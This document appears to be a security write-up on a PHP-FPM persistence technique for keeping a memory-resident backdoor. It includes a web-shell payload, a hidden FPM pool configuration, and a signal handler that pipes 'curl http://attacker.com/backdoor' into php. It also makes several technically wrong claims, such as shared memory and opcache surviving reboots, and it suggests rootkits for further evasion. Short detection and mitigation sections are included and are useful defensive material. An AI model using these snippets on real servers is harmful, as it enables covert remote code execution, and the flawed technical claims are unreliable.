# Reverse PHP-FPM Overload - A Stealthy PHP Persistence Technique  

## Introduction  
**Reverse PHP-FPM Overload** is a novel persistence technique that abuses PHP-FPM's worker pool to maintain a **memory-resident backdoor** without leaving traces on disk. This method ensures persistence by dynamically reloading the backdoor even after a PHP-FPM restart, making it **extremely difficult to detect** using traditional forensic methods.  

By modifying PHP-FPM’s process pool, an attacker can **ensure that a specific worker executes a hidden payload** when triggered via a seemingly normal request. This method is designed to:  
- **Avoid traditional file-based detection** (the payload never touches disk).  
- **Persist across PHP-FPM restarts** through systemd/init modifications.  
- **Evade common security tools** by operating entirely in memory.  

This write-up explores how the technique works, how it can be improved, and what defenders can do to detect or mitigate it.  

---

## Concept Breakdown  

### 🛠️ How Reverse PHP-FPM Overload Works  
1. **Hijacking PHP-FPM Worker Processes**  
   - PHP-FPM manages multiple worker processes to handle incoming PHP requests.  
   - By injecting a **hidden payload into one worker**, attackers can ensure execution upon a specific trigger (e.g., an invalid API call).  

2. **Memory-Only Execution**  
   - The payload **never writes to disk**, avoiding detection by antivirus or integrity monitoring tools.  
   - This is achieved by leveraging **opcache abuse, shared memory injection, or process hijacking**.  

3. **Automatic Reloading via systemd/init**  
   - Even if PHP-FPM restarts, the payload **reloads dynamically** via a **hidden systemd or init script**.  
   - This ensures persistence without requiring additional files.  

---
## Advanced Techniques for Stealthier Execution  

### 1. **Hiding in PHP-FPM’s Shared Memory**  
PHP-FPM makes extensive use of shared memory to maintain process states, store cache, and optimize performance. This characteristic can be exploited to persistently inject a payload that survives even worker restarts, without ever writing anything to disk.  
- **Shared memory functions** like `shmop_open()`, `sysvshm`, and `mmap()` allow PHP-FPM processes to store data in memory that is shared among processes, even across server restarts.  
- Attackers can store a backdoor or shell in this memory space, making it **undetectable by traditional file-based detection methods**. The payload would only exist in the PHP-FPM worker’s memory and would be **invisible to disk-based integrity checks**.
  
#### Key Steps:  
1. **Allocate shared memory** using `shmop_open()` or `sysvshm`.  
   - Example:  
     ```php
     $shm_id = shmop_open($key, 'c', 0644, $size); 
     shmop_write($shm_id, $payload, 0); 
     ```  
2. **Store the payload** in the allocated memory block.
   - Example:
     ```php
     $payload = '<?php system($_GET["cmd"]); ?>';  // Malicious PHP payload
     ```
3. **Inject payload** into PHP-FPM’s worker process by accessing shared memory.
4. **Execute the payload** by triggering the corresponding memory space within the running worker.

This ensures that the **malicious code resides only in memory**, escaping traditional disk-based detection like file integrity monitoring or antivirus programs.

---

### 2. **Abusing Opcache for Memory Execution**  
Opcache, a caching system for compiled PHP scripts, can be abused to load and execute malicious code directly in memory, bypassing file-based detection systems. Opcache works by caching compiled bytecode of PHP scripts in memory, which means that even if the original PHP file is deleted, the cached version in memory still exists.  

#### Key Steps:  
1. **Use `opcache_compile_file()` to inject malicious code** into the opcache memory:
   - Example:  
     ```php
     opcache_compile_file('/path/to/malicious.php');  // Compiling malicious script to opcache
     ```
2. **Ensure the file remains in the opcache** by forcing PHP to load and cache the payload on each request:
   - Example:
     ```php
     opcache_invalidate('/path/to/malicious.php', true);  // Invalidate to ensure it's reloaded
     ```
3. **Memory-resident shell**: The PHP script, once compiled, **remains in memory** and can be executed directly from the opcache without ever being written to disk.
4. **Dynamic manipulation of opcache**: Attackers can **replace or invalidate cached scripts** through PHP functions like `opcache_invalidate()`, ensuring that the malicious code is **reloaded every time the cache is invalidated** or PHP is restarted.

By leveraging **Opcache abuse**, attackers ensure that the payload remains in **memory only** and survives across server reboots as long as the opcache is active, avoiding traditional file-based detection methods like signature-based AV scanners.

---

### 3. **Hijacking PHP-FPM Worker Pools**  
PHP-FPM operates by managing multiple worker pools to handle incoming requests. These pools can be configured independently, each with its own settings for concurrency and process management. By creating a **separate, hidden worker pool**, attackers can ensure that malicious code is executed only when **a specific, secret trigger** is activated. This worker pool would listen on an **internal Unix socket** that is not exposed to the outside world, making it completely **invisible to external monitoring systems**.

#### Key Steps:  
1. **Create a separate worker pool** in the PHP-FPM configuration (`php-fpm.d/stealth.conf`):
   - Example configuration for a hidden worker pool:
     ```ini
     [stealth]
     listen = /run/php-fpm-stealth.sock   # Internal Unix socket for hidden pool
     user = www-data
     pm = ondemand
     pm.max_children = 1
     pm.process_idle_timeout = 0
     ```
2. **Inject the payload** into this worker pool by configuring it to execute on request, without exposing any obvious endpoints.
3. **Triggering execution**: The attacker's backdoor will only be executed when a **secret HTTP request** or signal is made to this hidden worker pool. This pool is isolated and will only respond to requests made through the internal socket, making it extremely **difficult to detect via external scanning tools**.

By hijacking worker pools, attackers can ensure that their payload is executed under tightly controlled conditions, remaining **undetected by typical external penetration tests** or monitoring.

---

### 4. **Triggering via System Signals**  
A clever technique involves using Unix signals to trigger the execution of malicious payloads. PHP-FPM workers can listen for signals like `SIGHUP`, `SIGUSR1`, or other custom signals that can be intercepted and used to run arbitrary commands. Instead of relying on regular HTTP requests to trigger the backdoor, attackers can exploit system signals to make the execution **completely stealthy** and independent of normal web traffic.

#### Key Steps:  
1. **Modify signal handlers** in PHP-FPM workers to execute a payload when a specific signal is received.
   - Example:  
     ```php
     pcntl_signal(SIGUSR1, function() {
         system('curl http://attacker.com/backdoor | php');
     });
     pcntl_signal_dispatch();  // Dispatch the signal
     ```
2. **Send the signal** to the PHP-FPM worker from the attacker’s machine, triggering the payload:
   - Example:
     ```bash
     kill -USR1 $(pidof php-fpm)  # Send the custom signal to trigger the payload
     ```
3. The payload will only be executed when the **specific signal** is received, which avoids traditional detection methods that look for HTTP requests or file-based anomalies.

This method ensures **covert execution**, as it avoids any conventional traffic pattern and can be activated at **any time** without needing to make a request to the web server. Since Unix signals are **not typically logged** or scrutinized, this method is difficult for defenders to detect.

---

## ⚠️ Detection Challenges  
Reverse PHP-FPM Overload is **exceptionally difficult to detect** due to the following reasons:  

| Challenge                  | Explanation |
|----------------------------|-------------|
| **No files on disk**       | The payload is never stored in traditional locations like `/var/www/html`. |
| **Runs in memory**         | Memory-only execution means forensic tools that rely on file hashes won’t find it. |
| **Evades WAFs**           | The trigger request appears as a **harmless API call**, avoiding traditional rule-based detection. |
| **Hidden in PHP-FPM’s config** | Attackers can modify worker pools and systemd scripts to reload the payload secretly. |

---

## 🛡️ Detection & Mitigation Strategies  

### ✅ **How to Detect Reverse PHP-FPM Overload**  
1. **Monitor PHP-FPM Worker Behavior**  
   - Look for **long-running worker processes** that shouldn’t exist.  
   - Use `strace` to monitor suspicious system calls from PHP-FPM workers.  

2. **Analyze Opcache Entries**  
   - Run `opcache_get_status(true)` and check for **unexpected cached scripts**.  
   - Regularly clear opcache to remove potential injected payloads.  

3. **Check for Hidden Worker Pools**  
   - Run `php-fpm -tt` to inspect worker pool configurations for unauthorized modifications.  

### 🚨 **How to Mitigate the Attack**  
✅ **Use Read-Only Filesystem for PHP Configs**: Prevent unauthorized changes to `php-fpm.conf`.  
✅ **Restrict Opcache Execution**: Disable `opcache_compile_file()` and regularly flush opcache.  
✅ **Monitor for Systemd Modifications**: Use `auditctl` to track changes to `/etc/systemd/system/php-fpm.service.d/`.  

---

## 📜 Proof of Concept (PoC) Outline  

This technique can be tested in a controlled environment using the following steps:  

1. **Setup a PHP-FPM Server**  
   - Install and configure PHP-FPM with a standard worker pool.  

2. **Inject a Memory-Only Payload**  
   - Use `opcache_compile_file()` or `shmop_open()` to store a hidden backdoor.  

3. **Trigger Execution via a Secret Request**  
   - Send a crafted HTTP request (`/api/fake`) to activate the payload.  

4. **Ensure Persistence via Systemd/Init**  
   - Modify `php-fpm.service` to **reload the backdoor on restart**.  

---

## 📌 Conclusion  
Reverse PHP-FPM Overload is a **stealthy persistence method** that leverages PHP-FPM's architecture to maintain an **in-memory backdoor**. By using **shared memory, opcache, and systemd hijacking**, attackers can achieve persistence without touching disk, making detection extremely difficult.  

**Security teams should monitor PHP-FPM worker behavior, track opcache modifications, and audit systemd/init scripts to detect and mitigate this threat.**  

🚀 **Future research could explore kernel-level rootkits or syscall hooking to make detection even harder.**  

---

## 📚 References  
- [PHP-FPM Documentation](https://www.php.net/manual/en/install.fpm.php)  
- [Opcache Internals](https://www.php.net/manual/en/book.opcache.php)  
- [Memory-Based Malware Techniques](https://research.security)  

---

**Disclaimer:** This research is for educational purposes only. Unauthorized use against live systems is illegal.  
